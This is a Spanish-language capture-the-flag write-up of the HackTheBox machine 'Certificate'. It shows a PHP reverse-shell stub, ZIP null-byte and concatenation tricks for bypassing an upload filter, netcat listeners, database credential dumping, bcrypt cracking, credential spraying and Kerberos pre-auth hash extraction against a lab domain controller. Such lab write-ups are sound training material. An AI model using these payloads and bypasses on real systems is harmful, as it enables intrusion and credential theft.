---
title: Certificate - Hard (HTB)
permalink: /Certificate-HTB-Writeup/
tags:
  - Windows
  - Hard
categories:
  - writeup
  - hacking
  - hackthebox
  - active directory
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
seo_tittle: Certificate - Hard (HTB)
seo_description: Realiza bypassing en archivos ZIP, abusa de kerberos, explota plantillas en AD CS y privilegios locales de Windows para vencer Certificate
excerpt: Realiza bypassing en archivos ZIP, abusa de kerberos, explota plantillas en AD CS y privilegios locales de Windows para vencer Certificate
header:
  overlay_image: /assets/images/headers/certificate-hackthebox.jpg
  overlay_filter: 0.7
  og_image: /assets/images/headers/certificate-hackthebox.jpg
---

![image-center](/assets/images/posts/certificate-hackthebox.png)
{: .align-center}


**Habilidades:** File Upload Bypass - `Null Byte` Injection or ZIP File Concatenation, Credentials Leakage, Domain Enumeration - `Bloodhound`, Packet Capture Analysis - `.pcap` File, Abusing AD CS - `ESC3` Technique, Abusing `SeManageVolumePrivilege` + Golden Certificate Attack [Privilege Escalation]
{: .notice--primary}

# Introducción

Certificate es una máquina Windows de dificultad `Hard` en HackTheBox en la que debemos comprometer un dominio de Active Directory utilizando técnicas que incluyen bypassing en archivos ZIP, análisis de tráfico `kerberos`, explotación de ESC3 en AD CS y explotación del privilegio local `SeManageVolumePrivlege` para obtener control completo sobre el dominio.
<br>
# Reconocimiento
---
Enviaremos una traza ICMP para comprobar que la máquina víctima se encuentre activa

~~~ bash
ping -c 1 10.10.11.71

PING 10.10.11.71 (10.10.11.71) 56(84) bytes of data.
64 bytes from 10.10.11.71: icmp_seq=1 ttl=127 time=240 ms

--- 10.10.11.71 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 239.697/239.697/239.697/0.000 ms
~~~


## Nmap Scanning 

Comenzaremos realizando un escaneo que se encargue de identificar puertos abiertos por el protocolo TCP

~~~ bash
nmap -p- --open -sS --min-rate 2500 -n -Pn 10.10.11.71 -oG openPorts

Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-04 09:15 EDT
Nmap scan report for 10.10.11.71
Host is up (0.76s latency).
Not shown: 65525 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
636/tcp   open  ldapssl
3269/tcp  open  globalcatLDAPssl
9389/tcp  open  adws
49718/tcp open  unknown
49737/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 57.69 seconds
~~~

- `--open`: Mostrar únicamente los puertos abiertos
- `-p-`: Hacer un escaneo del total de puertos **(65535)**
- `--min-rate 5000`: Enviar mínimo **5000 paquetes por segundo**
- `-n`: No aplicar **resolución DNS**, lo que acelera el escaneo
- `-sS`: Modo de **escaneo TCP SYN**, no concluye la conexión, lo que hace el escaneo más ágil
- `-Pn`: Omitir el **descubrimiento de host (ARP)**
- `-oG`: Exportar en formato `grepable`
- `-v`: Ver el progreso del escaneo

Lanzaremos un segundo escaneo, el cual intentará identificar la versión y los servicios que ejecuta cada uno de los puertos que hemos descubierto

~~~ bash
nmap -p 53,80,135,139,445,636,3269,9389,49718,49737 -sVC 10.10.11.71
                                
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-04 09:22 EDT
Nmap scan report for certificate.htb (10.10.11.71)
Host is up (0.42s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.0.30)
|_http-title: Certificate | Your portal for certification
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.0.30
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.certificate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.certificate.htb
| Not valid before: 2025-10-04T01:51:21
|_Not valid after:  2026-10-04T01:51:21
|_ssl-date: 2025-10-04T21:23:56+00:00; +8h00m01s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.certificate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.certificate.htb
| Not valid before: 2025-10-04T01:51:21
|_Not valid after:  2026-10-04T01:51:21
|_ssl-date: 2025-10-04T21:23:56+00:00; +8h00m01s from scanner time.
9389/tcp  open  mc-nmf        .NET Message Framing
49718/tcp open  msrpc         Microsoft Windows RPC
49737/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-10-04T21:23:18
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 8h00m00s, deviation: 0s, median: 8h00m00s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 105.30 seconds
~~~

- `-p`: Especificar puertos
- `-sV`: Identificar la versión del servicio 
- `-sC`: Uso de scripts de reconocimiento
- `-oN`: Exportar la salida en formato normal

Vemos una gran cantidad de servicios expuestos (como `dns`, `kerberos`, `LDAP`, `SMB`, `WinRM`, etc.), esto es un claro indicador de que estamos frente a un controlador de dominio de Active Directory.

Vemos tanto el nombre del dominio como del host, añadiremos esta información a nuestro archivo `/etc/hosts` para aplicar correctamente una resolución DNS y hacer referencia al dominio

~~~ bash
echo '10.10.11.71 certificate.htb DC01.certificate.htb' | sudo tee -a /etc/hosts
~~~


## Web Analysis

Vemos que el puerto `80` se encuentra abierto y muestra información acerca de un servicio web. Antes de visitar la web, podemos escanear las tecnologías que el servidor puede estar empleando para mostrar el contenido

~~~ bash
whatweb http://10.10.11.71                                                                                    
http://10.10.11.71 [301 Moved Permanently] Apache[2.4.58], Country[RESERVED][ZZ], HTTPServer[Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.0.30], IP[10.10.11.71], OpenSSL[3.1.3], PHP[8.0.30], RedirectLocation[http://certificate.htb/], Title[301 Moved Permanently]
~~~

El servidor intenta aplicar una redirección hacia el dominio `certificate.htb`. Veremos la siguiente web, que parece ser un portal educativo

![image-center](/assets/images/posts/certificate-web-analysis.png)
{: .align-center}


Tenemos la posibilidad de tanto de registrar una cuenta de usuario como de iniciar sesión en el portal

![image-center](/assets/images/posts/certificate-web-analysis-2.png)
{: .align-center}


Cuando iniciemos sesión, tendremos la opción de inscribir diversos cursos desde los detalles de cada uno dentro de `http://certificate.htb/course-details.php?id=1`

![image-center](/assets/images/posts/certificate-web-analysis-3.png)
{: .align-center}


Al inscribir un curso, si navegamos al final desbloquearemos la opción de responder una encuesta, la web nos redirige a `http://certificate.htb/upload.php?s_id=42`

![image-center](/assets/images/posts/certificate-web-que.png)
{: .align-center}


### File Upload 

La nueva web que muestra el servidor es la siguiente. Se indican instrucciones que nos revelan información sobre el procesamiento de los archivos

![image-center](/assets/images/posts/certificate-file-upload.png)
{: .align-center}


- Las extensiones aceptadas corresponden a documentos de ofimática: `.pdf`, `.docx`, `.pptx` y `.xlsx`
- Debemos incluir nuestro documento en un archivo comprimido `.zip`

Esto nos dice que todo el contenido de nuestro comprimido será extraído por el servidor. Podemos generar un archivo `PDF` rápidamente para ver el comportamiento de la web con el siguiente script en `python`

~~~ python
from reportlab.pdfgen import canvas
from reportlab.lib.pagesizes import letter
from reportlab.lib.colors import blue

# Create a new PDF document
c = canvas.Canvas("my_document.pdf", pagesize=letter)

# Set document title
c.setTitle("My Python-Generated PDF")

# Add text to the PDF
c.setFont("Helvetica", 24)
c.drawString(100, 750, "Hello, World!")

c.setFont("Times-Roman", 12)
c.setFillColor(blue)
c.drawString(100, 700, "This is a sample document created with Python and ReportLab.")

# Add more lines of text
c.drawString(100, 680, "You can add multiple lines and customize their appearance.")
c.drawString(100, 660, "For example, changing font, size, and color.")

# Save the PDF
c.save()
print("PDF 'my_document.pdf' created successfully.")
~~~

Para poder generar un `PDF` con el código anterior, necesitaremos la librería `reportlab`, la instalaremos en un entorno virtual de `python`

~~~ bash
python3 -m venv .venv
source .venv/bin/activate
pip install reportlab

python3 main.py
zip test.zip my_document.pdf
~~~

Al subir nuestro archivo `test.zip`, el servidor genera un link desde el cual podemos acceder a nuestro archivo `PDF`, bajo la ruta `static/uploads/hash/archivo`

![image-center](/assets/images/posts/certificate-file-upload-2.png)
{: .align-center}

<br>


# Intrusión / Explotación
---
Dado el contexto en el que estamos (`xampp`), podríamos pensar en ejecutar código malicioso desde un script de PHP para ganar acceso.

Es posible ganar acceso inicial empleando dos técnicas para evadir filtros de detección de archivos maliciosos, en este caso, archivos PHP.


## Understanding ZIP File Structure

Para entender cómo ganamos acceso mediante un comprimido `.zip` malicioso, necesitaremos comprensión acerca de los [componentes de un archivo ZIP](https://users.cs.jmu.edu/buchhofp/forensics/formats/pkzip.html). Un archivo comprimido posee la siguiente estructura esencial

- **Entradas de archivo** (`File Entries`): Cada archivo se almacena con metadatos como su nombre, tamaño y fecha de modificación, esta sección de metadatos es conocida como `Local File Header`.

- **Directorio Central** (`Central Directory`): Se encuentra al final del archivo ZIP, incluye una lista de archivos junto con su ubicación dentro del ZIP. El lector ZIP consulta el directorio central para localizar y mostrar los archivos.

- **EOCD** (Fin del Directorio Central o `End of Central Directory`): Este registro se encuentra al final del archivo ZIP e indica dónde comienza el directorio central, facilita a los lectores ZIP encontrar los archivos 

![image-center](/assets/images/posts/certificate-zip-file.png)
{: .align-center}



Realizando pruebas con diferentes formas de ejecutar una reverse shell en PHP, la función que ha funcionado para mi caso ha sido utilizar la función `shell_exec()`.

El contenido de `shell.php` es el siguiente, en mi caso generé una reverse shell desde [`revshells.com`](https://www.revshells.com/), utilizando un payload `PowerShell #3 (Base64)`

~~~ php
<?php
shell_exec("powershell -e BASE64_REVERSE_SHELL");
?>
~~~


## 1. File Upload Bypass - Null Byte Injection

La primera técnica que podemos utilizar para evadir el filtro de archivos es inyectando un `Null Byte` dentro de los metadatos del archivo comprimido ZIP que el servidor espera que subamos.

El nombre del archivo se almacena como **parte de los metadatos** dentro de `Local File Header` y el EOCD (`End of the Central Directory`)

> Para realizar correctamente la inyección y según la estructura de un ZIP, necesitaremos modificar tanto parte del inicio como del final del comprimido.
{: notice--warning}

Comenzaremos con renombrar nuestro archivo PHP malicioso con un caracter que podamos identificar y que será reemplazado, en este caso un punto. 

Agregaremos el archivo renombrado a un comprimido nuevo, por ejemplo `evil.zip`


~~~ bash
mv shell.php shell..pdf
zip evil.zip shell.php..pdf
~~~

Ahora editamos el archivo `evil.zip` con un editor hexadecimal, en mi caso usé `hexeditor`

~~~ bash
hexeditor evil.zip
~~~

> Una vez dentro del archivo podemos presionar `TAB` para intercambiar la vista entre `ASCII` y  hexadecimal. 
{: .notice--warning}

Modificaremos el punto que se sitúa inmediatamente después de `shell.php` para sobreescribir este caracter con un `byte` nulo (`00`) tanto al principio como al final del archivo, más o menos se vería de la siguiente manera

![image-center](/assets/images/posts/certificate-null-byte-injection.png)
{: .align-center}


Guardamos los cambios con `F10` y presionando `y`. Ahora debemos subir este archivo ZIP modificado a la web

![image-center](/assets/images/posts/certificate-null-byte-injection-2.png)
{: .align-center}


Cuando accedamos al enlace nos mostrará un espacio en el nombre del archivo (`shell.php .pdf`)

![image-center](/assets/images/posts/certificate-null-byte-injection-3.png)
{: .align-center}


Iniciaremos un listener para recibir la reverse shell, en mi caso escogí el puerto `443`

~~~ bash
rlwrap -cAr nc -lvnp 443     
listening on [any] 443 ...
~~~

Para ejecutar la reverse shell, bastará con borrar este espacio vacío y todo lo que le sigue para así visitar la siguiente URL, apuntando al archivo `shell.php`

~~~ http
http://certificate.htb/static/uploads/HASH/shell.php
~~~

Cuando cargue la página, desde nuestro listener recibiremos una consola de `powershell` como el usuario `xamppuser`

~~~ bash
rlwrap -cAr nc -lvnp 443     
listening on [any] 443 ...
connect to [10.10.16.123] from (UNKNOWN) [10.10.11.71] 64722

PS C:\xampp\htdocs\certificate.htb\static\uploads\8ad6b1453a685cd6a629959dcfb5039d> whoami
certificate\xamppuser
~~~


## 2. File Upload Bypass - ZIP File Concatenation

Opcionalmente, podemos utilizar otro enfoque para ganar acceso mediante un archivo `.zip` que contenga un archivo malicioso. 

La técnica de evasión por concatenación de archivos ZIP (`ZIP Concatenation Evasion`) es un método para **ocultar malware** y eludir detecciones añadiendo múltiples archivos dentro de un mismo comprimido ZIP.

> Aunque un **archivo comprimido combinado** puede parecer un único archivo, en realidad contiene varios **directorios centrales**, cada uno de los cuales apunta a diferentes conjuntos de **entradas de archivos**. 
{: .notice--info}

### Proof of Concept

En el siguiente ejemplo se muestra cómo se realizaría la concatenación de los archivos ZIP comprimidos 

~~~ bash
echo 'this is a harmless file!' > first.txt
echo 'This is a very scary malware' > second.txt
zip pt1.zip first.txt
zip pt2.zip second.txt
cat pt1.zip pt2.zip > combined.zip
~~~

En este caso, dos archivos ZIP legítimos (`pt1.zip` y `pt2.zip`) se concatenan en un solo archivo (`combined.zip`).

El **directorio central** del segundo archivo (`pt2.zip`) tiene prioridad, lo que significa que solo los archivos que aparecen en este directorio son **visibles** para ciertos lectores de ZIP. 

> Cada herramienta procesa el directorio central de manera diferente, lo que da lugar a una visibilidad variada del contenido oculto o malicioso.
{: .notice--info}

 Cuando abrimos el archivo `combined.zip`, lectores como `WinRar` o con `Windows File Explorer` pueden mostrar el contenido del segundo archivo comprimido. La siguiente imagen muestra cómo lo procesa `WinRAR`

![image-center](/assets/images/posts/certificate-zip-file-concatenation.png)
{: .align-center}


El siguiente ejemplo muestra a `Windows File Explorer` abriendo el contenido del segundo archivo si cambiamos la extensión a `.rar`

![image-center](/assets/images/posts/certificate-zip-file-concatenation-2.png)
{: .align-center}


Utilizando esta técnica podríamos ocultar un archivo malicioso para eludir detecciones y sea alojado en el servidor web. Para luego acceder a él y lograr ejecución remota de comandos

Comenzaremos creando un archivo comprimido que contenga nuestro `PDF`

~~~ bash
zip 1.zip my_document.pdf
  adding: my_document.pdf (deflated 46%)
~~~

Crearemos otro comprimido que contenga nuestro archivo malicioso

~~~ bash
zip -r 2.zip evil        
  adding: evil/ (stored 0%)
  adding: evil/shell.php (deflated 60%)
~~~

Ahora concatenaremos los dos comprimidos para generar un tercero, en mi caso lo he llamado `evil.zip`

~~~ bash
cat 1.zip 2.zip > evil.zip
~~~

A la hora de subir el comprimido, se generará un enlace que podemos visitar, el cual nos lleva a nuestro archivo PDF, que podría lucir más o menos así

~~~ http
http://certificate.htb/static/uploads/c8a2599725bd1085a06529f991aafce9/my_document.pdf
~~~

Antes de ejecutar la reverse shell, iniciaremos un listener con `netcat` para recibir una consola de `powershell` por un puerto determinado. En mi caso he escogido el puerto `443`

~~~ bash
rlwrap -cAr nc -lvnp 443
listening on [any] 443 ...
~~~

Si visitamos el enlace generado, visualizaremos nuestro archivo PDF

![image-center](/assets/images/posts/certificate-zip-file-concatenation-3.png)
{: .align-center}


Intentaremos abrir nuestro archivo malicioso `shell.php`, para eso cambiaremos la ruta tal como lo definimos a la hora de comprimir el archivo

~~~ http
http://certificate.htb/static/uploads/8cab52ee39a496bcb224cdb3e5d654d6/evil/shell.php
~~~


## Shell as `xamppuser`

Desde nuestro listener recibiremos una consola de `powershell` como el usuario que ejecuta el servicio web, en este caso, `xamppuser`

~~~ bash
rlwrap -cAr nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.16.123] from (UNKNOWN) [10.10.11.71] 52234

PS C:\xampp\htdocs\certificate.htb\static\uploads\8cab52ee39a496bcb224cdb3e5d654d6\evil> whoami
certificate\xamppuser
~~~


## Credentials Leakage

Cambiaremos de directorio para ubicarnos en la raíz de la ruta donde se alojan los archivos del servidor web

~~~ powershell
PS C:\xampp\htdocs\certificate.htb> cd ..\..\..\..\
PS C:\xampp\htdocs\certificate.htb> dir

    Directory: C:\xampp\htdocs\certificate.htb
    
Mode                LastWriteTime         Length Name               
----                -------------         ------ ----
d-----       12/26/2024   1:49 AM                static
-a----       12/24/2024  12:45 AM           7179 about.php
-a----       12/30/2024   1:50 PM          17197 blog.php
-a----       12/30/2024   2:02 PM           6560 contacts.php
-a----       12/24/2024   6:10 AM          15381 course-details.php
-a----       12/24/2024  12:53 AM           4632 courses.php
-a----       12/23/2024   4:46 AM            549 db.php
-a----       12/22/2024  10:07 AM           1647 feature-area-2.php
-a----       12/22/2024  10:22 AM           1331 feature-area.php
-a----       12/22/2024  10:16 AM           2955 footer.php
-a----       12/23/2024   5:13 AM           2351 header.php
-a----       12/24/2024  12:52 AM           9497 index.php
-a----       12/25/2024   1:34 PM           5908 login.php
-a----       12/23/2024   5:14 AM            153 logout.php
-a----       12/24/2024   1:27 AM           5321 popular-courses-area.php
-a----       12/25/2024   1:27 PM           8240 register.php
-a----       12/28/2024  11:26 PM          10366 upload.php  
~~~

Si inspeccionamos el contenido del archivo `db.php`, veremos las credenciales para conectarse a la base de datos.


## Database Enumeration

Recordemos que en un entorno `xampp`, el motor de base de datos utilizado por defecto es `MySQL`. El binario para ejecutar `mysql` se debería encontrar dentro de `C:\xampp\mysql\bin\mysql.exe`

Comenzaremos enumerando las bases de datos existentes (nota como ejecuto las queries en el parámetro `-e`)

~~~ powershell
PS C:\xampp\mysql\bin> .\mysql.exe -h 127.0.0.1 -u 'certificate_webapp_user' -p'cert!f!c@teDBPWD' -e 'show databases;'
Database
certificate_webapp_db
information_schema
test
~~~

Mostraremos las tablas para la base de datos `certificate_webapp_db`, dando uso a la base de datos en la misma línea separado de un `;`

~~~ powershell
PS C:\xampp\mysql\bin> .\mysql.exe -h 127.0.0.1 -u 'certificate_webapp_user' -p'cert!f!c@teDBPWD' -e 'use certificate_webapp_db; show tables'
Tables_in_certificate_webapp_db
course_sessions
courses
users
users_courses
~~~

Consultaremos los datos de la tabla `users`, además de aplicar un filtro que puede ser útil para no ver la cuenta que hemos creado, utilizando un `|` seguido de `findstr`, buscando como si fuera `grep` 

~~~ powershell
PS C:\xampp\mysql\bin> .\mysql.exe -h 127.0.0.1 -u 'certificate_webapp_user' -p'cert!f!c@teDBPWD' -e 'use certificate_webapp_db; select * from users' | findstr certificate.htb

1	Lorra	Armessa	Lorra.AAA	lorra.aaa@certificate.htb	$2y$04$bZs2FUjVRiFswY84CUR8ve02ymuiy0QD23XOKFuT6IM2sBbgQvEFG	2024-12-23 12:43:10	teacher	1
10	Sara	Brawn	sara.b	sara.b@certificate.htb	$2y$04$CgDe/Thzw/Em/M4SkmXNbu0YdFo6uUs3nB.pzQPV.g8UdXikZNdH6	2024-12-25 21:31:26	admin	1
~~~


## Hash Cracking

Opcionalmente, podemos realizar un pequeño tratamiento de los datos extraídos, con el propósito de extraer los hashes para intentar descifrarlos de forma offline.

Simplemente cambiando un caracter y luego filtrando por campos específicos obtendremos una lista de `2` hashes para intentar crackear

~~~ bash
echo '1   Lorra   Armessa Lorra.AAA       lorra.aaa@certificate.htb       $2y$04$bZs2FUjVRiFswY84CUR8ve02ymuiy0QD23XOKFuT6IM2sBbgQvEFG    2024-12-23 12:43:10
teacher 1
10      Sara    Brawn   sara.b  sara.b@certificate.htb  $2y$04$CgDe/Thzw/Em/M4SkmXNbu0YdFo6uUs3nB.pzQPV.g8UdXikZNdH6    2024-12-25 21:31:26     admin   1' | tr '\t' ';' | cut -d ';' -f6-6 | tee hashes.txt

$2y$04$bZs2FUjVRiFswY84CUR8ve02ymuiy0QD23XOKFuT6IM2sBbgQvEFG
$2y$04$CgDe/Thzw/Em/M4SkmXNbu0YdFo6uUs3nB.pzQPV.g8UdXikZNdH6
~~~

Procederemos a ejecutar `john` empleando el diccionario `rockyou.txt` para intentar encontrar alguna contraseña que coincida con alguno de estos hashes

~~~ bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
Created directory: /root/.john
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 16 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Blink182         (?)
~~~

Generaremos un listado rápido de la gran cantidad de usuarios (`2`, aunque es útil este tip en caso de que sean muchos más), parecido a cómo lo hicimos con los hashes

~~~ bash
echo '1   Lorra   Armessa Lorra.AAA       lorra.aaa@certificate.htb       $2y$04$bZs2FUjVRiFswY84CUR8ve02ymuiy0QD23XOKFuT6IM2sBbgQvEFG    2024-12-23 12:43:10
teacher 1
10      Sara    Brawn   sara.b  sara.b@certificate.htb  $2y$04$CgDe/Thzw/Em/M4SkmXNbu0YdFo6uUs3nB.pzQPV.g8UdXikZNdH6    2024-12-25 21:31:26     admin   1' | tr '\t' ';' | cut -d ';' -f5-5 | cut -d '@' -f1-1 | tee users.txt

lorra.aaa
sara.b
~~~

Validaremos las credenciales para ambas cuentas, intentando autenticarnos con una lista de los usuarios que hemos encontrado. La contraseña será válida para la cuenta `sara.b`

~~~ bash
nxc smb DC01.certificate.htb -u users.txt -p 'Blink182' 
SMB         10.10.11.71     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certificate.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.71     445    DC01             [-] certificate.htb\lorra.aaa:Blink182 STATUS_LOGON_FAILURE 
SMB         10.10.11.71     445    DC01             [+] certificate.htb\sara.b:Blink182
~~~

La cuenta `sara.b` parece ser que forma parte del grupo `Remote Management Users`, esto debido al mensaje que vemos al autenticarnos en `winrm`

~~~ bash
nxc winrm DC01.certificate.htb -u 'sara.b' -p 'Blink182'                                                                 
WINRM       10.10.11.71     5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:certificate.htb)
WINRM       10.10.11.71     5985   DC01             [+] certificate.htb\sara.b:Blink182 (Pwn3d!)
~~~


## Domain Analysis - `Bloodhound`

Como disponemos de credenciales válidas, recolectaremos información del dominio para analizarla desde `Bloodhound`, enumerando relaciones entre usuarios y vías potenciales para elevar nuestros privilegios

~~~ bash
ntpdate DC01.certificate.htb && bloodhound-python -d certificate.htb -ns 10.10.11.71 --zip -c All -u sara.b -p 'Blink182'
2025-09-28 18:32:03.545771 (-0400) +0.010341 +/- 0.115739 DC01.certificate.htb 10.10.11.71 s1 no-leap
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: certificate.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.certificate.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 3 computers
INFO: Connecting to LDAP server: dc01.certificate.htb
INFO: Found 19 users
INFO: Found 58 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: WS-05.certificate.htb
INFO: Querying computer: WS-01.certificate.htb
INFO: Querying computer: DC01.certificate.htb
INFO: Done in 01M 11S
INFO: Compressing output into 20250928183209_bloodhound.zip
~~~

Opcionalmente, podemos generar una lista de usuarios del dominio con herramientas como `rpcclient` y aplicando un tratamiento a la salida del comando

~~~ bash
rpcclient DC01.certificate.htb -U 'sara.b%Blink182' -c enumdomusers | cut -d ' ' -f1-1 | grep -oP '\[.*?\]' | tr -d '[]' | tee users.txt

Administrator
Guest
krbtgt
Kai.X
Sara.B
John.C
Aya.W
Nya.S
Maya.K
Lion.SK
Eva.F
Ryan.K
akeder.kh
kara.m
Alex.D
karol.s
saad.m
xamppuser
~~~


## Shell as `sara.b`

Sabiendo que `sara.b` es miembro del grupo `Remote Management Users`, podremos conectarnos a la máquina con una consola de `powershell` empleando herramientas como `evil-winrm` o su versión de `python`, `evil-winrm-py`

~~~ bash
evil-winrm-py -i DC01.certificate.htb -u 'sara.b' -p 'Blink182'
        ▘▜      ▘             
    █▌▌▌▌▐ ▄▖▌▌▌▌▛▌▛▘▛▛▌▄▖▛▌▌▌
    ▙▖▚▘▌▐▖  ▚▚▘▌▌▌▌ ▌▌▌  ▙▌▙▌
                          ▌ ▄▌ v1.1.2
[*] Connecting to DC01.certificate.htb:5985 as sara.b
evil-winrm-py PS C:\Users\Sara.B\Documents> whoami
certificate\sara.b
~~~


## Interesting Files

Dentro de la carpeta `Documents` de `sara.b`, existe una carpeta que hace referencia a una computadora a nivel de dominio (`WS-01`).

Dentro de `WS-01`, encontraremos un archivo de texto además de lo que parece ser una captura de paquetes

~~~ powershell
evil-winrm-py PS C:\Users\Sara.B\Documents> dir

    Directory: C:\Users\Sara.B\Documents

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        11/4/2024  12:53 AM                WS-01

evil-winrm-py PS C:\Users\Sara.B\Documents> dir WS-01

    Directory: C:\Users\Sara.B\Documents\WS-01

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        11/4/2024  12:44 AM            530 Description.txt
-a----        11/4/2024  12:45 AM         296660 WS-01_PktMon.pcap
~~~

Descargaremos estos archivos en nuestra máquina con la funcionalidad `download`

~~~ powershell
evil-winrm-py PS C:\Users\Sara.B\Documents> download WS-01\WS-01_PktMon.pcap .

evil-winrm-py PS C:\Users\Sara.B\Documents> download WS-01\description.txt .
~~~

El archivo `description.txt` contiene el siguiente mensaje

~~~ bash
The workstation 01 is not able to open the "Reports" smb shared folder which is hosted on DC01.
When a user tries to input bad credentials, it returns bad credentials error.
But when a user provides valid credentials the file explorer freezes and then crashes!
~~~

El mensaje hace alusión a un problema con la computadora `WS-01`, podemos sintetizar lo siguiente
- La estación de trabajo (`WS-01`), no permite abrir el recurso compartido `Reports`, tampoco una carpeta compartida alojada en `DC01`.
- Cuando un usuario se autentica con credenciales válidas, el explorador de archivos se congela y se cierra.


## Packet Capture Analysis - `.pcap` File

Abriremos la captura de paquetes con `wireshark` para analizar el tráfico. Aplicando un filtro al protocolo `kerberos`, veremos un flujo de autenticación, el cual comienza con un paquete `AS-REQ`

### Understanding Kerberos Authentication

> El protocolo **Kerberos** es un sistema de **autenticación de red** que proporciona una **autenticación fuerte** para aplicaciones cliente-servidor mediante el uso de **criptografía de clave simétrica** y un **tercero de confianza** centralizado, el **Centro de Distribución de Claves (KDC)**, para evitar el envío de contraseñas por la red.
{: .notice--info}

Este protocolo se basa en el intercambio de tickets, que sirven como prueba de identidad, permitiendo el inicio de sesión único (`SSO`) de un usuario a diferentes servicios.

En el proceso de autenticación de `kerberos`, interactúan tres entidades principales:

- Cliente: Un usuario o un proceso en nombre de éste.
- KDC (`Key Distribution Center`): Es el centro de distribución de claves, verifica la identidad de usuarios y servicios dentro de una red emitiendo "tickets" (certificados), los cuales otorgan acceso a diferentes servicios.
- Aplicación (`AP` o `Application Server`): Aplicación o recurso dentro de una red que un cliente puede solicitar y usar después de que su identidad haya sido verificada. 

Los tickets `kerberos` son tokens de autenticación emitidos por el KDC y tienen un tiempo límite

- TGT (`Ticket Granting Ticket`): Permite al cliente solicitar tickets de servicio sin tener que volver a autenticarse
- ST (`Service Ticket`): Autentica al cliente en un servicio específico de la red

El KDC contiene dos componentes principales que se encargan de autenticar al usuario y emitir los tickets `kerberos`

- `Authentication Server`: Se encarga de realizar la autenticación inicial de los clientes.
- `Ticket Granting Server`: Proporciona los tickets de servicio (`ST`) para que un cliente ya autenticado pueda acceder a los recursos que solicita dentro de un dominio.

Dentro de un flujo de autenticación `kerberos`, se tramitan el siguiente conjunto de paquetes

#### `AS-REQ`

El cliente envía un mensaje al `Authentication Server`, este mensaje contiene el nombre del cliente, el servicio solicitado, y una marca de tiempo (`timestamp`) cifrado con el hash NTLM del usuario.

#### `AS-REP`

El servidor de autenticación (`AS`) valida la identidad del usuario y si es exitosa responde con un TGT, el cual contiene una **clave de sesión**.

#### `TGS-REQ`

El cliente esencialmente envía el TGT y un `Authenticator`, el cual es un`timestamp` cifrado con la **clave de sesión** obtenida del TGT, además de otros parámetros. 

Este mensaje es enviado al `Ticket Granting Server` con el propósito de obtener un ST (`Service Ticket`).

#### `TGS-REP`

El `Ticket Granting Server` valida el TGT y el `Authenticator`, si son correctos responde con un ST (`Service Ticket`), el cual está cifrado con la **clave secreta de servicio**.

#### `AP-REQ`

El cliente presenta el `ST` al servidor de aplicación, además de otro `Authenticator`, que está cifrado con la **clave de sesión** del ticket de servicio.

#### `AP-REP`

El servidor valida la identidad del usuario y le otorga acceso al servicio.

![image-center](/assets/images/posts/certificate-kerberos.gif)
{: .align-center}


Podemos construir un hash para intentar descifrarlo por fuerza bruta con los valores del segundo paquete `AS-REQ`, el cual es el que inicia la autenticación. 

Utilizamos el segundo paquete `AS-REQ` debido a que el primero genera el error `KRB5KDC_ERR_PREAUTH_REQUIRED` al no enviar la prueba de conocimiento de contraseña (el `timestamp` cifrado), esto es completamente normal, es un aviso del DC hacia el cliente

![image-center](/assets/images/posts/certificate-wireshark.png)
{: .align-center}


El formato de hash que soporta la herramienta `hashcat` se vería representado de la siguiente manera

~~~ bash
$krb5pa$18$Lion.SK$certificate.htb$23f5159fa1c66ed7b0e561543eba6c010cd31f7e4a4377c2925cf306b98ed1e4f3951a50bc083c9bc0f16f0f586181c9d4ceda3fb5e852f0
~~~

- `$Lion.SK`: Nombre del cliente que solicita autenticación
- `$certificate.htb`: Nombre del dominio
- `$23f...`: Valor del campo `cipher`, el cual es el `timestamp` cifrado

